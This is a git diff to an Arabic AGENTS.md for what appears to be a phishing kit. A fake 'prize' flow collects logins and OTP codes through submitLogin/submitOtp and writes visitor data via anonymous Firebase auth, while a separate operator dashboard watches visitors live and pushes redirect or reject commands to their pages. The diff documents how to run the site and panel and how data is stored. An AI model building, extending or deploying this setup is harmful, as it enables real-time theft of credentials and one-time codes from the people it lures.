@@ -1,13 +1,15 @@
 # AGENTS.md — مشروع صفحات الجوائز (prize flow)
 
-مشروع مختصر يحتوي **فقط** مسار الجوائز: أربع صفحات + سكربتاتها + خادم Python بسيط.
+مشروع مختصر يحتوي مسار الجوائز (أربع صفحات + سكربتاتها + خادم Python) ولوحة التحكم
+المنفصلة `dashboardkuwaitalthnyan-main/` التي يتابع منها المدير الزوار ويوافق/يرفض.
 
 ## التشغيل
 
 ```bash
 cp .env.example .env      # ثم املأ مفاتيح Firebase
 python3 build_env_js.py   # يولّد assets/js/firebase-env.js (للاستضافة الثابتة)
-python3 serve.py          # PORT افتراضي 12001
+python3 serve.py          # الموقع، PORT افتراضي 12001
+python3 dashboardkuwaitalthnyan-main/serve_dashboard.py   # اللوحة، PORT افتراضي 12000
 ```
 
 - `/` → `index.html` (صفحة الدخول)
@@ -24,7 +26,8 @@ python3 serve.py          # PORT افتراضي 12001
 | `assets/js/firebase-client.js` | تهيئة Firebase، الجلسة `sessionId`، `submitLogin`/`submitOtp`، `listenForAdminCommands` |
 | `assets/js/page-commands.js` | استماع صفحات العميل لأوامر التوجيه/الرفض من لوحة التحكم |
 | `assets/js/firebase-env.js` | **مولّد** من `.env` عبر `build_env_js.py` (غير مرفوع في Git) |
-| `serve.py` | خادم HTTP: يحقن `window.__FIREBASE_ENV__`، gzip، كاش، `/healthz` |
+| `serve.py` | خادم الموقع: يحقن `window.__FIREBASE_ENV__`، gzip، كاش، `/healthz` |
+| `dashboardkuwaitalthnyan-main/` | لوحة التحكم المنفصلة (موقع ثابت) — `serve_dashboard.py` يحقن إعداد Firebase بدل Vite |
 | `firebase_config.py` | قراءة المفاتيح من متغيّرات البيئة أو `.env` |
 | `firebase.json` / `firestore.rules` / `database.rules.json` | إعداد ونشر قواعد Firebase |
 | `netlify.toml` / `_redirects` | إعداد الاستضافة الثابتة (Netlify) |
@@ -35,8 +38,9 @@ python3 serve.py          # PORT افتراضي 12001
 `FIREBASE_STORAGE_BUCKET`, `FIREBASE_MESSAGING_SENDER_ID`, `FIREBASE_APP_ID`,
 `FIREBASE_MEASUREMENT_ID` — إعدادات عامة تُحقن في المتصفح.
 
-`FIREBASE_PANEL_EMAIL`, `FIREBASE_PANEL_PASSWORD` — حساب المصادقة مع Firestore
-(مطلوب: تسجيل الدخول المجهول معطّل). بدونهما تفشل كتابة/قراءة بيانات العميل.
+`FIREBASE_PANEL_EMAIL`, `FIREBASE_PANEL_PASSWORD` — حساب المصادقة مع Firestore.
+تسجيل الدخول المجهول (Anonymous) مُفعّل في المشروع، فالصفحات تكتب بياناتها بدونه،
+لكنه مطلوب لتسجيل دخول لوحة التحكم.
 
 `SITE_URL` — اختياري، النطاق العام للروابط المطلقة.
 
